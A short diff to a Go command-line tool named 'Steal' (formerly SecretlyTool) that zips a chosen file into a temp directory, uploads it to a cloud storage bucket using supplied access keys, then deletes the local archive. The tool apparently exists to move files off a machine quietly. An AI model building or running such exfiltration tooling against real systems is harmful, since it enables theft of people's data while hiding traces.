@@ -35,7 +35,7 @@ func main() {
 		dst = "/tmp/" + fileName + "_" + nowTime + ".zip"
 	}
 	if sysType == "windows" {
-		dst = os.Getenv("temp") + "\\" + fileName + "_" + nowTime + ".zip"
+		dst = "C:\\Windows\\Temp" + "\\" + fileName + "_" + nowTime + ".zip"
 	}
 	fmt.Println("[+] In the compression")
 	if pack.Zip(src, dst) != nil {
@@ -49,6 +49,8 @@ func main() {
 	}
 	if os.Remove(dst) != nil {
 		fmt.Println("[-] Failed to delete the package file. Manually delete the package file")
+	} else {
+		fmt.Println("[+] Temporary file deleted successfully")
 	}
 	fmt.Println("[+] The file was uploaded successfully")
 
@@ -59,12 +61,12 @@ func init() {
 	flag.Parse()
 	fmt.Println(Banner)
 	if len(os.Args) <= 4 {
-		fmt.Println("Steal version: SecretlyTool/0.0.2\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
+		fmt.Println("Steal version: Steal/0.0.2\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
 	if *h == true {
-		fmt.Println("Steal version: SecretlyTool/0.0.2\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
+		fmt.Println("Steal version: Steal/0.0.2\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
